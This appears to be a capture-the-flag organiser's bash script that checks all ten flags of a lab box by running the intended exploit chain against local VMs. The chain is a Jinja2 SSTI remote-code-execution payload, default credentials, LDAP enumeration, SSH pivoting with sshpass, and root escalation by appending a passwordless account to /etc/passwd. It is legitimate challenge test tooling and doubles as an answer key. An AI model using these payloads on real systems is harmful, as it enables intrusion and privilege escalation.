#!/usr/bin/env bash
# verify.sh — proves all 10 flags end-to-end against the freshly
# provisioned trio of VMs, the same way a player would: HTTP against
# gateway's published port, SSTI RCE for everything else, pivoting
# from there to directory (ldapsearch) and fileserver (ssh) exactly
# as the story intends -- never via any build-only shortcut.
set -euo pipefail
cd "$(dirname "$0")/.."

WEB_PORT=8005
BASE="http://localhost:$WEB_PORT"
RELEASE_SECRET=$(cat ../organizer/release-secret.txt)

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import hmac, hashlib
d = hmac.new('$RELEASE_SECRET'.encode(), f'expert-the-annex:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

# Runs $1 as a shell command on the gateway host, via the SSTI RCE in
# /welcome -- every later step in this box goes through this one
# primitive (that's the point: one web bug, then everything else is
# reached by pivoting from it).
rce() {
    local cmd="$1"
    local payload="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${cmd}').read() }}"
    curl -s --get --data-urlencode "name=$payload" "$BASE/welcome"
}

echo "== flag 1: page source =="
F1=$(curl -s "$BASE/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

echo "== flag 2: default creds =="
F2=$(curl -s -d "username=annex_staff&password=welcome2024" "$BASE/login" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 2 "$F2"

echo "== flag 3: SSTI confirmed as real RCE =="
F3=$(rce 'cat /opt/gateway/secret/flag3.txt' | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

echo "== flags 4+5: pivot via ldapsearch against the internal directory =="
LDAP_OUT=$(rce 'ldapsearch -x -H ldap://directory -b dc=halcyon,dc=local 2>&1')
F4=$(echo "$LDAP_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '1p')
check 4 "$F4"
F5=$(echo "$LDAP_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '2p')
check 5 "$F5"
FS_PW=$(echo "$LDAP_OUT" | sed -n 's/.*ops \/ \([a-f0-9]*\).*/\1/p')

echo "== flag 6: pivot via SSH pre-auth banner on the never-published fileserver =="
F6=$(rce "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null fileserver 2>&1" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 6 "$F6"

# Runs $1 as a shell command ON FILESERVER, as ops, via the gateway RCE.
# Base64-wrapped end to end so no level of quoting collides.
remote_ops() {
    local b64
    b64=$(printf '%s' "$1" | base64 -w0)
    rce "sshpass -p $FS_PW ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ops@fileserver \"echo $b64 | base64 -d | bash\" 2>&1"
}

echo "== flag 7: log in as ops with the password the directory service disclosed =="
F7=$(remote_ops 'cat flag7.txt' | grep -oE 'HLC\{[a-f0-9]{10}\}' | tail -1)
check 7 "$F7"

echo "== flags 8+9: world-writable /etc/passwd -> root-equivalent account -> root =="
PRIV_CMD='echo r00t::0:0:root:/root:/bin/bash >> /etc/passwd && su r00t -c "cat /root/flag8.txt /root/audit.log"'
ROOT_OUT=$(remote_ops "$PRIV_CMD")
F8=$(echo "$ROOT_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '2p')
check 8 "$F8"
F9=$(echo "$ROOT_OUT" | grep -oE 'HLC\{[a-f0-9]{10}\}' | sed -n '3p')
check 9 "$F9"
# Jinja2 autoescapes the RCE output -- a literal '"' comes back as "&#34;".
DOSSIER_PW=$(echo "$ROOT_OUT" | grep -oE 'passphrase &#34;[a-f0-9]+&#34;' | grep -oE '[a-f0-9]{15,}')

echo "== flag 10: pull the encrypted dossier, decrypt locally with the recovered passphrase =="
B64=$(remote_ops 'su r00t -c "cat /root/dossier.enc | base64 -w0"' 2>/dev/null | tr -d '\n ')
B64_CLEAN=$(echo "$B64" | grep -oE '[A-Za-z0-9+/=]{40,}' | tr -d '\n')
echo "$B64_CLEAN" | base64 -d > /tmp/annex_dossier.enc
F10=$(python3 -c "
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

MAGIC = b'HLCX1'
with open('/tmp/annex_dossier.enc', 'rb') as f:
    blob = f.read()
rest = blob[len(MAGIC):]
salt, nonce, ct = rest[:16], rest[16:28], rest[28:]
key = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1).derive('$DOSSIER_PW'.encode())
print(AESGCM(key).decrypt(nonce, ct, None).decode())
")
check 10 "$F10"
rm -f /tmp/annex_dossier.enc

echo
echo "All 10 flags verified end-to-end."
